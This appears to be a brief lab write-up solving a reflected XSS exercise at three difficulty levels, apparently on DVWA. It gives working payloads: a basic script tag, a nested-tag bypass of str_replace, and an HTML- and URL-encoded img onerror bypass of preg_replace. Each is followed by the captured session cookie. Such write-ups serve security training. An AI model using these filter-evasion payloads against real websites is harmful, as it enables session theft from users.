# XSS (Refected)

Objective

One way or another, steal the cookie of a logged in user.

## low

basic XSS attack to steal cookie

```html
<script>document.write(document.cookie)</script>
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=low

## medium

We need to bypass `str_replace()` filter.

```html
<scr<script>ipt>document.write(document.cookie)</script>
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=medium

## high

Usage of `<script>` is limited by `preg_replace()`, but we can html-encode 
character 'p' to bypass.

```html
<img src="" onerror="javascript:document.write(document.cookie)">
<img src="" onerror="javascri&#112;t:document.write(document.cookie)">
%3c%69%6d%67%20%73%72%63%3d%22%22%20%6f%6e%65%72%72%6f%72%3d%22%6a%61%76%61%73%63%72%69%26%23%31%31%32%3b%74%3a%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%22%3e
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=high
